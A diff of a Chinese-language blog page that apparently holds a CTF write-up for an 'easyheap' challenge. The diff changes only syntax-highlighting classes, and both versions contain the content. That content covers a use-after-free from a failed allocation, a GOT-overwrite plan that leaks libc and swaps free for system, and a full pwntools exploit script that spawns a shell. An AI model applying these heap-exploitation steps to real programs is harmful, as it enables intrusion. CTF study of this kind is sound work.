@@ -101,14 +101,14 @@
 
 <p>下面分析一下具体细节：
 第一个就是添加一个message结构体，长下面这样:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000 message         struc ; (sizeof=0x10, mappedto_6)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000 message         struc ; (sizeof=0x10, mappedto_6)
 00000000 content_ptr     dq ?
 00000008 size            dd ?
 0000000C padding         dd ?
 00000010 message         ends
 </code></pre></div></div>
 
-<p>然后检查一下size后就会分配nbytes大小的空间，存到content_ptr那里，假如nbytes的大小大于1024的话就会申请失败，但是<code class="highlighter-rouge">ptr[i]</code>却已经分配过了，return之前却没有free掉。所以这里便是漏洞的关键。</p>
+<p>然后检查一下size后就会分配nbytes大小的空间，存到content_ptr那里，假如nbytes的大小大于1024的话就会申请失败，但是<code class="language-plaintext highlighter-rouge">ptr[i]</code>却已经分配过了，return之前却没有free掉。所以这里便是漏洞的关键。</p>
 
 <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">add_message</span><span class="p">()</span> <span class="p">{</span>
   <span class="n">message</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx</span>
@@ -176,7 +176,7 @@
 <ol>
   <li>首先分配0x20, 0x80, 0x20三个message</li>
   <li>然后free掉0 1，此时bins构造如下：
-    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fastbins
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fastbins
 0x20: 0x119e050 —▸ 0x119e000 ◂— 0x0
 0x30: 0x119e020 ◂— 0x0
 0x40: 0x0
@@ -192,10 +192,10 @@ largebins
 empty
 </code></pre></div>    </div>
   </li>
-  <li>add一个0x401的message，导致分配失败，此时<code class="highlighter-rouge">ptr[0]</code>中便是<code class="highlighter-rouge">0x119e050</code>，这里比较骚的是<code class="highlighter-rouge">ptr[0]-&gt;content_ptr == 0x119e000</code>，因为<code class="highlighter-rouge">ptr[0]</code>的fd指针仍指向前一个chunk，形成uaf。并且<code class="highlighter-rouge">ptr[0]-&gt;size == 0x80</code></li>
-  <li>add一个0x20,此时便有两个指针指向<code class="highlighter-rouge">*ptr[1]</code>,即<code class="highlighter-rouge">ptr[0]-&gt;content_ptr</code>与<code class="highlighter-rouge">ptr[1]</code>,此时我们便可以通过<code class="highlighter-rouge">edit(0)</code>来覆盖<code class="highlighter-rouge">ptr[1]-&gt;content_ptr</code>实现任意写.由于<code class="highlighter-rouge">ptr[0]</code>在高地址，因此顺便可以覆盖<code class="highlighter-rouge">ptr[0]-&gt;content_ptr</code>为puts_got，用于泄漏libc。</li>
-  <li>通过任意写将free_got覆盖成puts_plt实现任意读，通过<code class="highlighter-rouge">delete(0)</code>泄露puts_got</li>
-  <li>再次edit修改free_got为system，并将<code class="highlighter-rouge">*ptr[2]-&gt;content_ptr</code>写为<code class="highlighter-rouge">/bin/sh\x00</code></li>
+  <li>add一个0x401的message，导致分配失败，此时<code class="language-plaintext highlighter-rouge">ptr[0]</code>中便是<code class="language-plaintext highlighter-rouge">0x119e050</code>，这里比较骚的是<code class="language-plaintext highlighter-rouge">ptr[0]-&gt;content_ptr == 0x119e000</code>，因为<code class="language-plaintext highlighter-rouge">ptr[0]</code>的fd指针仍指向前一个chunk，形成uaf。并且<code class="language-plaintext highlighter-rouge">ptr[0]-&gt;size == 0x80</code></li>
+  <li>add一个0x20,此时便有两个指针指向<code class="language-plaintext highlighter-rouge">*ptr[1]</code>,即<code class="language-plaintext highlighter-rouge">ptr[0]-&gt;content_ptr</code>与<code class="language-plaintext highlighter-rouge">ptr[1]</code>,此时我们便可以通过<code class="language-plaintext highlighter-rouge">edit(0)</code>来覆盖<code class="language-plaintext highlighter-rouge">ptr[1]-&gt;content_ptr</code>实现任意写.由于<code class="language-plaintext highlighter-rouge">ptr[0]</code>在高地址，因此顺便可以覆盖<code class="language-plaintext highlighter-rouge">ptr[0]-&gt;content_ptr</code>为puts_got，用于泄漏libc。</li>
+  <li>通过任意写将free_got覆盖成puts_plt实现任意读，通过<code class="language-plaintext highlighter-rouge">delete(0)</code>泄露puts_got</li>
+  <li>再次edit修改free_got为system，并将<code class="language-plaintext highlighter-rouge">*ptr[2]-&gt;content_ptr</code>写为<code class="language-plaintext highlighter-rouge">/bin/sh\x00</code></li>
   <li>delete(2)实现getshell</li>
 </ol>
 
@@ -204,8 +204,8 @@ empty
 </span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">base64</span>
 <span class="n">local</span> <span class="o">=</span> <span class="mi">1</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>
-<span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'split'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>
+<span class="n">context</span><span class="p">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'split'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>
 <span class="k">if</span> <span class="n">local</span><span class="p">:</span>
     <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./easyheap"</span><span class="p">)</span>
     <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./easyheap"</span><span class="p">)</span>
@@ -215,30 +215,30 @@ empty
     <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./easyheap"</span><span class="p">)</span>
     <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"How long is this message?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What is the content of the message?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"How long is this message?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What is the content of the message?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>    
-    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What is the index of the item to be deleted?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What is the index of the item to be deleted?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
     
 <span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What is the index of the item to be modified?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What is the content of the message?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What is the index of the item to be modified?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What is the content of the message?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
 
-<span class="n">free_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"free"</span><span class="p">]</span>
-<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
-<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
+<span class="n">free_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"free"</span><span class="p">]</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
 <span class="n">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1">#0
 </span><span class="n">add</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1">#1
 </span><span class="n">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span> <span class="c1">#2
@@ -246,11 +246,11 @@ empty
 </span><span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 <span class="c1">#gdb.attach(p)
 </span><span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"How long is this message?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">1030</span><span class="p">))</span> <span class="c1">#0 *struct 
+<span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"How long is this message?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">1030</span><span class="p">))</span> <span class="c1">#0 *struct 
 # gdb.attach(p)
 </span>
 <span class="n">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span><span class="c1">#1 
@@ -263,22 +263,22 @@ empty
 <span class="c1">#gdb.attach(p)
 </span><span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">))</span>
 <span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\x7f</span><span class="s">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\x7f</span><span class="s">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
 <span class="c1">#print hex(puts_addr)
-</span><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
+</span><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span><span class="o">-</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
 <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span>
 <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
 
 <span class="c1">#gdb.attach(p)
 </span>
-<span class="n">sys</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="n">sys</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
 <span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">sys</span><span class="p">))</span>
 <span class="c1">#gdb.attach(p)
 </span><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
 
 <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
 
-<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <h3 id="总结">总结</h3>
